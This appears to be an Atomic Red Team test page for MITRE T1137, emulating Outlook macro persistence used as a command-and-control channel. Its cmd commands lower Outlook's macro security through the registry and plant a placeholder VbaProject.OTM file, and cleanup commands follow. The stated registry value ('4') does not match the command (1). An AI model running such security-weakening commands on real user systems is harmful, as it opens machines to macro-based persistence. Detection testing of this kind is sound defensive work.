---
tags: [T1137, atomic_test]
filename: "[[T1137 - Office Application Startup]]"
---
# T1137 - Office Application Startup

## Atomic Test #1 - Office Application Startup - Outlook as a C2
As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ 
it is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.
Too achieve this two things must happened on the syste
- The macro security registry value must be set to '4'
- A file called VbaProject.OTM must be created in the Outlook Folder.

**Supported Platforms:** Windows


**auto_generated_guid:** bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c






#### Attack Commands: Run with `command_prompt`! 


```cmd
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /t REG_DWORD /d 1 /f
mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
```

#### Cleanup Commands:
```cmd
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /f >nul 2>&1
del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
```





<br/>
